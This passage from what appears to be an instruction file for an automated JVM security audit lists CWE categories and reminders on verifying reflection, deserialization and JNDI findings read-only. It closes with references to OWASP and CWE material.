- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-843: Access of Resource Using Incompatible Type ('Type Confusion')
- CWE-400: Uncontrolled Resource Consumption
- CWE-665: Improper Initialization
- CWE-672: Operation on a Resource after Expiration or Release
- CWE-913: Improper Control of Dynamically-Managed Code Resources
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- CWE-1108: Excessive Reliance on Global Variables

***

## Important Reminders
[ref: #jvm-anomalies-important-reminders]

- JVM anomaly detection is **high-signal but easy to over-report**. Many Java/Kotlin applications use reflection for dependency injection, serialization, or testing. Always verify whether the input is attacker-controllable.
- Check **dependency versions** for known JVM deserialization or JNDI vulnerabilities: Log4j2, Jackson, XStream, Kryo, Fastjson, Apache Commons Collections, etc.
- Check **git history** for the insertion of suspicious code: `git log -p --follow -- <file>` and `git blame -L <start>,<end> <file>`.
- Do **not** run exploit payloads against production. Verification must be read-only (configuration review, version checks, static taint analysis, benign marker tests).
- Preserve evidence before remediation: screenshots, commit hashes, dependency versions, and file hashes.
- Subagents are read-only: they must not modify project source code, commit changes, or run potentially malicious code.
- Intermediate-file lifecycle is owned by `execution-protocol.md`: the merge stage deletes `24_recon.md`, `24_batch_*.md`, and `24_verify_*.md`; only the final `{{ REPORTS_ROOT }}/24_jvm_anomalies.md` persists.

***

## References
[ref: #jvm-anomalies-references]

- OWASP API Security Top 10 2023 — API5:2023 Broken Function Level Authorization
- OWASP API Security Top 10 2023 — API8:2023 Security Misconfiguration
- OWASP API Security Top 10 2023 — API10:2023 Unsafe Consumption of APIs
- OWASP Cheat Sheet Series — Deserialization
- OWASP Cheat Sheet Series — Logging
- CWE-502: Deserialization of Untrusted Data
- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-913: Improper Control of Dynamically-Managed Code Resources
- JNDI Injection and Log4j2 (CVE-2021-44228) post-mortems
